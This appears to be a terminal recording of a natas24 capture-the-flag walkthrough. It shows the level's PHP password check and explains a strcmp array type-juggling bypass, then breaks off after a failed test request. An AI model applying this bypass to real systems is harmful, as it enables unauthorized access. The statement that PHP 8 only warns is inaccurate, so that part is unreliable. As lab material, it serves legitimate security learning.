[0.002, "o", "$ curl -s -u natas24:<pw> http://natas24.natas.labs.overthewire.org/index-source.html\r\n$   source: if(!strcmp($_REQUEST[\"passwd\"],\"<censored>\")) print credentials\r\n"]
[0.404, "o", "if(!strcmp($_REQUEST[\"passwd\"],\"<censored>\")){            echo \"<br>The credentials for the next level are:<br>\";            echo \"<pre>Username: natas25 Password: <censored></pre>\";        }\r\n"]
[0.001, "o", "$ strcmp() wants strings. If passwd is an ARRAY, PHP 7/8 raises a warning and\r\n$   strcmp() returns NULL -> !NULL is true -> the check passes.\r\n$   PHP does NOT abort on the warning, so execution continues into the branch.\r\n$ curl -s -u natas24:<pw> 'http://natas24.natas.labs.overthewire.org/?passwd=x'\r\n"]
[0.381, "o", "Password:\r\nWrong!  \r\n"]
